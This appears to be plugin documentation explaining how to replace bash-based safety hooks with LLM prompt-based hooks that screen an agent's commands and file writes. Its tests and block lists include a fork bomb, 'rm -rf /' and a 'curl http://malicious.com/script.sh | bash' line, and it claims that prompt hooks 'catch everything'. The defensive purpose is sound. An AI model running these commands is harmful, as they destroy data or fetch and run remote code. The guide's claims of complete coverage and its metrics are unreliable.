# Migrating from Basic to Advanced Hooks

This guide demonstrates how to migrate from command-based hooks to advanced prompt-based hooks for better maintainability, flexibility, and intelligence.

## Why Migrate?

### Command Hooks (Traditional Approach)

**Characteristics:**
- Hardcoded pattern matching
- String comparisons and regex
- Limited to predefined rules
- Requires code changes for new scenarios
- Difficult to maintain for complex logic

**Example:**
```bash
if [[ "$command" == *"rm -rf"* ]]; then
  echo "Blocked"
  exit 2
fi
```

**Problems:**
- Only catches exact "rm -rf" pattern
- Misses "rm -fr", "rm -r -f", ":(){ :|:& };:"
- No understanding of intent
- Requires constant updates

### Prompt Hooks (Advanced Approach)

**Characteristics:**
- Natural language criteria
- LLM-powered reasoning
- Context-aware decisions
- Adapts to new scenarios
- Easy to modify criteria

**Example:**
```json
{
  "type": "prompt",
  "prompt": "Analyze command for destructive operations: rm, delete, drop, truncate, format, dd, mkfs. Consider variations and intent. Return decision with explanation."
}
```

**Benefits:**
- Catches all variations
- Understands intent, not just strings
- Handles edge cases
- Future-proof against new attack patterns

## Migration Examples

### Example 1: Bash Command Validation

#### Before (Command Hook)

**Configuration:**
```json
{
  "PreToolUse": [
    {
      "matcher": "Bash",
      "hooks": [
        {
          "type": "command",
          "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate-bash.sh"
        }
      ]
    }
  ]
}
```

**Script (validate-bash.sh):**
```bash
#!/bin/bash
input=$(cat)
command=$(echo "$input" | jq -r '.tool_input.command // empty')

# Check for dangerous commands
if [[ "$command" == *"rm -rf"* ]]; then
  echo '{"continue": true, "systemMessage": "rm -rf detected"}' >&2
  exit 2
fi

if [[ "$command" == *"dd if="* ]]; then
  echo '{"continue": true, "systemMessage": "dd command detected"}' >&2
  exit 2
fi

if [[ "$command" == *"sudo"* ]]; then
  echo '{"continue": true, "systemMessage": "sudo detected"}' >&2
  exit 2
fi

# Add more patterns as needed...
# This list keeps growing!
exit 0
```

**Problems:**
- 50+ lines of hardcoded patterns
- Easy to miss variations
- No understanding of context
- Requires code changes for new threats

#### After (Prompt Hook)

**Configuration:**
```json
{
  "PreToolUse": [
    {
      "matcher": "Bash",
      "hooks": [
        {
          "type": "prompt",
          "prompt": "Analyze bash command for safety. Check for: 1) Destructive operations (rm, delete, drop, truncate, format, dd, mkfs, fdisk, chown -R, chmod -R 777) including variations (rm -rf, rm -fr, rm -r -f, :(){ :|:& };:) 2) Privilege escalation (sudo, su, doas) 3) Network operations (curl, wget, scp, rsync to external hosts) 4) System modifications (package managers, service management) 5) Command injection potential. Return 'allow', 'ask', or 'deny' with explanation.",
          "timeout": 15
        }
      ]
    }
  ]
}
```

**Benefits:**
- 10 lines of natural language
- Catches variations automatically
- Understands intent
- Easy to add criteria
- Future-proof

**Migration Steps:**

1. **Extract validation logic**
   ```bash
   # Command hook had:
   if [[ "$command" == *"rm -rf"* ]]; then exit 2; fi

   # Becomes in prompt:
   "Check for destructive operations (rm, delete, drop, truncate, format, dd, mkfs)"
   ```

2. **Add intent understanding**
   ```bash
   # Command hook could only check strings
   # Prompt hook understands:
   # - "delete all files" is dangerous
   # - "remove temp files" might be OK
   # - "clean build artifacts" is generally safe
   ```

3. **Test comprehensively**
   ```bash
   # Test cases that command hook might miss:
   # - rm -fr /path
   # - :(){ :|:& };:
   # - sudo vim /etc/config
   # - curl http://malicious.com/script.sh | bash
   ```

**Performance Comparison:**
- Command hook: ~5-10ms (but misses threats)
- Prompt hook: ~500-1500ms (but catches everything)

### Example 2: File Write Validation

#### Before (Command Hook)

**Configuration:**
```json
{
  "PreToolUse": [
    {
      "matcher": "Write|Edit",
      "hooks": [
        {
          "type": "command",
          "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/validate-write.sh"
        }
      ]
    }
  ]
}
```

**Script (validate-write.sh):**
```bash
#!/bin/bash
input=$(cat)
file_path=$(echo "$input" | jq -r '.tool_input.file_path // empty')
content=$(echo "$input" | jq -r '.tool_input.content // empty')

# Check path traversal
if [[ "$file_path" == *".."* ]]; then
  echo '{"continue": true, "systemMessage": "Path traversal"}' >&2
  exit 2
fi

# Check system directories
if [[ "$file_path" == /etc/* ]] || [[ "$file_path" == /sys/* ]]; then
  echo '{"continue": true, "systemMessage": "System directory"}' >&2
  exit 2
fi

# Check file extensions
if [[ "$file_path" == *.env ]] || [[ "$file_path" == *secret* ]]; then
  echo '{"continue": true, "systemMessage": "Sensitive file"}' >&2
  exit 2
fi

# Check for secrets in content (simple pattern)
if echo "$content" | grep -qE "(api[_-]?key|password).{0,20}['\"]?[A-Za-z0-9]{20,}"; then
  echo '{"continue": true, "systemMessage": "Secret in content"}' >&2
  exit 2
fi

# And many more checks...
exit 0
```

**Problems:**
- Complex bash logic
- Easy to miss edge cases
- Pattern matching is fragile
- Content analysis is limited

#### After (Prompt Hook)

**Configuration:**
```json
{
  "PreToolUse": [
    {
      "matcher": "Write|Edit",
      "hooks": [
        {
          "type": "prompt",
          "prompt": "Analyze file write operation for safety. Check: 1) File path: $TOOL_INPUT.file_path - not in system directories (/etc, /sys, /boot, /var/log, /proc), no path traversal (../), not sensitive files (.env, secrets, keys, credentials, *.key, *.pem, id_rsa) 2) Content: $TOOL_INPUT.content (first 500 chars) - no API keys (pattern: api[_-]?key.*[A-Za-z0-9]{20,}), no private keys (-----BEGIN.*PRIVATE KEY-----), no database URLs with credentials (postgresql://user:pass@...), no AWS credentials (aws_.*key.*[A-Za-z0-9/+]{16,}) 3) File size reasonable (< 100MB) 4) Binary files appropriate. Return decision with specific concerns.",
          "timeout": 20
        }
      ]
    }
  ]
}
```

**Benefits:**
- Natural language criteria
- Content-aware validation
- Flexible pattern matching
- Easy to understand and modify

**Migration Steps:**

1. **Convert patterns to criteria**
   ```bash
   # Before:
   if [[ "$file_path" == *.env ]]; then exit 2; fi

   # After:
   "not sensitive files (.env, secrets, keys, credentials)"
   ```

2. **Add context awareness**
   ```bash
   # Before: Simple string check
   if echo "$content" | grep -qE "pattern"; then

   # After: LLM understands context
   "no API keys or secrets in content"
   ```

3. **Enhance validation**
   ```bash
   # Command hook: Limited to regex patterns
   # Prompt hook: Understands various secret formats
   ```

### Example 3: Task Completion Validation

#### Before (Command Hook)

**Configuration:**
```json
{
  "Stop": [
    {
      "matcher": "*",
      "hooks": [
        {
          "type": "command",
          "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/check-completion.sh"
        }
      ]
    }
  ]
}
```

**Script (check-completion.sh):**
```bash
#!/bin/bash
input=$(cat)
transcript_path=$(echo "$input" | jq -r '.transcript_path')

# Check if tests were run
if grep -q "npm test\|yarn test\|cargo test" "$transcript_path"; then
  tests_run=true
else
  tests_run=false
fi

# Check if build succeeded
if grep -q "npm run build\|yarn build\|cargo build" "$transcript_path"; then
  build_run=true
else
  build_run=false
fi

# Make decision
if [ "$tests_run" = true ] && [ "$build_run" = true ]; then
  echo '{"decision": "approve"}'
else
  echo '{"decision": "block", "reason": "Tests or build not run"}'
fi

exit 0
```

**Problems:**
- Hardcoded command patterns
- Doesn't understand context
- Limited to simple pattern matching
- Can't detect if work is actually complete

#### After (Prompt Hook)

**Configuration:**
```json
{
  "Stop": [
    {
      "matcher": "*",
      "hooks": [
        {
          "type": "prompt",
          "prompt": "Review transcript at $TRANSCRIPT_PATH to verify task completion. Check: 1) If code was modified (Look for Write/Edit tool usage), were tests executed? Look for test commands (npm test, yarn test, cargo test, pytest, etc) and check if they passed 2) Did builds succeed? Look for build commands (npm run build, cargo build, mvn compile, etc) and verify success 3) Were all user questions answered? 4) Is documentation updated if needed? 5) Are there TODO comments or incomplete work? 6) Did the user indicate satisfaction or completion? Return 'approve' if all checks pass, or 'block' with specific missing items and reasons.",
          "timeout": 30
        }
      ]
    }
  ]
}
```

**Benefits:**
- Understands context
- Flexible criteria
- Natural language rules
- Comprehensive validation

## Hybrid Approach

Don't abandon command hooks entirely! Use both:

### Multi-Stage Validation

```json
{
  "PreToolUse": [
    {
      "matcher": "Bash",
      "hooks": [
        {
          "type": "command",
          "command": "bash ${CLAUDE_PLUGIN_ROOT}/scripts/quick-check.sh",
          "timeout": 5
        },
        {
          "type": "prompt",
          "prompt": "Deep analysis of bash command: $TOOL_INPUT.command. Check for sophisticated threats, command injection, and context-aware dangers.",
          "timeout": 20
        }
      ]
    }
  ]
}
```

**quick-check.sh:**
```bash
#!/bin/bash
input=$(cat)
command=$(echo "$input" | jq -r '.tool_input.command // empty')

# Ultra-fast path: approve obviously safe commands
if [[ "$command" =~ ^(ls|pwd|echo|date|whoami|cat)$ ]]; then
  exit 0
fi

# Ultra-dangerous: immediately block
if [[ "$command" == *"rm -rf /"* ]] || [[ "$command" == *":(){ :|:& };:"* ]]; then
  echo '{"continue": true, "systemMessage": "Dangerous operation"}' >&2
  exit 2
fi

# Let prompt hook handle everything else
exit 0
```

**Benefits:**
- Command hook: Instant approval for safe commands (< 5ms)
- Prompt hook: Smart analysis for everything else
- Best of both worlds

## When to Keep Command Hooks

Command hooks still excel at:

### 1. Ultra-Fast Deterministic Checks

```bash
# File size check (instant)
size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
if [ "$size" -gt 1000000 ]; then
  echo '{"continue": true, "systemMessage": "File too large"}' >&2
  exit 2
fi
```

### 2. External Tool Integration

```bash
# Run security scanner
scan_result=$(security-tool scan "$file" 2>&1)
if [ $? -ne 0 ]; then
  echo "{\"continue\": true, \"systemMessage\": \"Security scan failed: $scan_result\"}" >&2
  exit 2
fi
```

### 3. SessionStart Setup

```bash
# Load project context
cd "$CLAUDE_PROJECT_DIR"
if [ -f "package.json" ]; then
  echo "export PROJECT_TYPE=nodejs" >> "$CLAUDE_ENV_FILE"
fi
```

### 4. Simple Pattern Matching

```bash
# Approve safe commands immediately
if [[ "$command" =~ ^(ls|pwd|echo|date|whoami|id)$ ]]; then
  exit 0
fi
```

## Migration Strategy

### Phase 1: Audit Existing Hooks

1. **List all hooks**
   ```bash
   grep -r "type.*command\|type.*prompt" hooks/
   ```

2. **Categorize by complexity**
   - Simple: Pattern matching, file checks
   - Complex: Multi-criteria validation, context-aware

3. **Identify candidates for migration**
   - Simple pattern matching → Prompt hooks
   - Complex logic → Keep or hybrid

### Phase 2: Prioritize Migration

**High Priority (Migrate First):**
- Security validation hooks
- Complex validation logic
- Frequently changing rules
- Difficult to maintain

**Low Priority (Keep Command):**
- Ultra-fast checks (< 10ms)
- External tool integration
- Session initialization
- Simple yes/no logic

### Phase 3: Migrate Incrementally

**Don't migrate everything at once!**

1. **Start with one hook**
   ```json
   {
     "PreToolUse": [
       {
         "matcher": "Bash",
         "hooks": [
           {
             "type": "prompt",
             "prompt": "Test prompt hook"
           }
         ]
       }
     ]
   }
   ```

2. **Test thoroughly**
   ```bash
   # Create test cases
   ./scripts/test-hook.sh scripts/validate-bash.sh safe-command.json
   ./scripts/test-hook.sh scripts/validate-bash.sh dangerous-command.json
   ```

3. **Validate in Claude Code**
   ```bash
   claude --debug
   # Test with real commands
   ```

4. **Monitor and adjust**
   - Review hook decisions
   - Adjust prompts as needed
   - Keep command hook as backup during transition

### Phase 4: Optimize

1. **Measure performance**
   ```bash
   # Time hook execution
   time echo '{"tool_input": {"command": "ls"}}' | bash validate.sh
   ```

2. **Optimize prompts**
   - Be specific but concise
   - Provide clear criteria
   - Avoid ambiguous language

3. **Add caching if needed**
   ```bash
   # Cache expensive operations
   cache_key=$(echo "$input" | md5sum | cut -d' ' -f1)
   ```

## Migration Checklist

### Pre-Migration

- [ ] Audit existing hooks
- [ ] Categorize by complexity
- [ ] Prioritize migration candidates
- [ ] Document current behavior
- [ ] Create test cases
- [ ] Set up test environment

### During Migration

- [ ] Migrate one hook at a time
- [ ] Write prompt in natural language
- [ ] Test with safe operations
- [ ] Test with dangerous operations
- [ ] Test edge cases
- [ ] Validate in Claude Code
- [ ] Keep command hook as backup

### Post-Migration

- [ ] Remove old command hook
- [ ] Update documentation
- [ ] Train team on new hooks
- [ ] Monitor for issues
- [ ] Gather user feedback
- [ ] Iterate on prompts

## Common Migration Patterns

### Pattern: String Contains → Natural Language

**Before (Command):**
```bash
if [[ "$command" == *"sudo"* ]]; then
  echo "Privilege escalation" >&2
  exit 2
fi
```

**After (Prompt):**
```
"Check for privilege escalation (sudo, su, doas, pkexec)"
```

### Pattern: Regex → Intent

**Before (Command):**
```bash
if [[ "$file" =~ \.(env|secret|key|token)$ ]]; then
  echo "Sensitive file" >&2
  exit 2
fi
```

**After (Prompt):**
```
"Verify not writing to credential files (.env, secrets, keys, tokens, passwords, *.key, *.pem)"
```

### Pattern: Multiple Conditions → Criteria List

**Before (Command):**
```bash
if [ condition1 ] || [ condition2 ] || [ condition3 ]; then
  echo "Invalid" >&2
  exit 2
fi
```

**After (Prompt):**
```
"Check: 1) condition1 2) condition2 3) condition3. Deny if any fail."
```

### Pattern: Hardcoded Lists → Flexible Patterns

**Before (Command):**
```bash
dangerous_commands=("rm -rf" "dd if=" "mkfs" "fdisk")
for cmd in "${dangerous_commands[@]}"; do
  if [[ "$command" == *"$cmd"* ]]; then
    echo "Dangerous" >&2
    exit 2
  fi
done
```

**After (Prompt):**
```
"Check for destructive operations: file deletion (rm, del, remove), disk operations (dd, fdisk, mkfs), system modifications"
```

## Testing Migrated Hooks

### Test Cases

Create comprehensive test cases:

```json
{
  "name": "Safe command test",
  "input": {
    "tool_input": {
      "command": "ls -la"
    }
  },
  "expected": "approve"
}
```

```json
{
  "name": "Dangerous command test",
  "input": {
    "tool_input": {
      "command": "rm -rf /"
    }
  },
  "expected": "deny"
}
```

### Testing Workflow

1. **Unit test scripts**
   ```bash
   ./scripts/test-hook.sh --create-sample PreToolUse > test-input.json
   ```

2. **Run test suite**
   ```bash
   for test in tests/*.json; do
     result=$(cat "$test" | bash validate.sh)
     # Check result matches expected
   done
   ```

3. **Validate in Claude Code**
   ```bash
   claude --debug
   # Execute test commands
   ```

4. **Regression testing**
   - Test all scenarios from old hook
   - Verify new hook catches more
   - Check for false positives

## Performance Considerations

### Response Time Comparison

| Scenario | Command Hook | Prompt Hook | Hybrid |
|----------|--------------|-------------|---------|
| Safe command (ls) | 5ms | 800ms | 5ms (command approves) |
| Dangerous (rm -rf) | 5ms | 900ms | 5ms (command blocks) |
| Unknown command | 5ms | 1200ms | 1200ms (both run) |
| Complex validation | N/A | 2000ms | 2000ms |

### Optimization Tips

1. **Use command hooks for fast paths**
   - Approve obviously safe commands instantly
   - Block obviously dangerous commands instantly

2. **Optimize prompts**
   - Be specific but concise
   - Provide clear criteria
   - Avoid ambiguity

3. **Set appropriate timeouts**
   - Simple validation: 10-15s
   - Complex analysis: 20-30s
   - Never exceed 60s

4. **Cache expensive operations**
   ```bash
   # Cache validation results
   cache_key=$(echo "$input" | md5sum | cut -d' ' -f1)
   ```

## Managing Change

### Versioning Hooks

Keep track of hook versions:

```json
{
  "version": "2.0.0",
  "migration_date": "2024-01-15",
  "changes": [
    "Migrated from command to prompt hooks",
    "Improved pattern matching",
    "Added context awareness"
  ]
}
```

### Rollback Plan

Always have a rollback plan:

```bash
# Keep old hooks in backup/
mv hooks/hooks.json hooks/hooks.json.new
mv hooks/hooks.json.old hooks/hooks.json

# Restart Claude Code
exit
```

### Gradual Rollout

1. **Deploy to test environment**
2. **Enable for small user group**
3. **Monitor for issues**
4. **Gradually increase scope**
5. **Full deployment**

## Documentation Updates

### Update README

```markdown
## Hooks (v2.0)

This plugin uses prompt-based hooks for intelligent validation:

### Security Hooks
- PreToolUse: Validates file writes and bash commands
- Stop: Ensures quality standards before completion

### Configuration
Edit `hooks/hooks.json` to customize behavior.

### Migration from v1.x
Command hooks have been replaced with prompt hooks for better flexibility.
```

### Document Prompt Logic

Explain the validation criteria:

```markdown
### Prompt Hook Criteria

**File Write Validation:**
- Not in system directories (/etc, /sys, /boot)
- Not credential files (.env, secrets, keys)
- No path traversal (../)
- Content doesn't contain secrets

**Bash Command Validation:**
- No destructive operations (rm -rf, dd, mkfs)
- No privilege escalation (sudo, su)
- No network operations without consent
```

## Success Metrics

### Before Migration

- Time to add new validation rule: 2-4 hours
- False negatives (missed threats): 15%
- Maintenance effort: High
- Code complexity: High

### After Migration

- Time to add new validation rule: 5-10 minutes
- False negatives: < 2%
- Maintenance effort: Low
- Code complexity: Low

## Conclusion

Migrating to prompt-based hooks provides:
- **Better security**: Catch more threats
- **Easier maintenance**: Natural language criteria
- **Greater flexibility**: Easy to modify
- **Future-proof**: Adapts to new scenarios

Follow the migration strategy, test thoroughly, and don't abandon command hooks entirely—use both for optimal performance!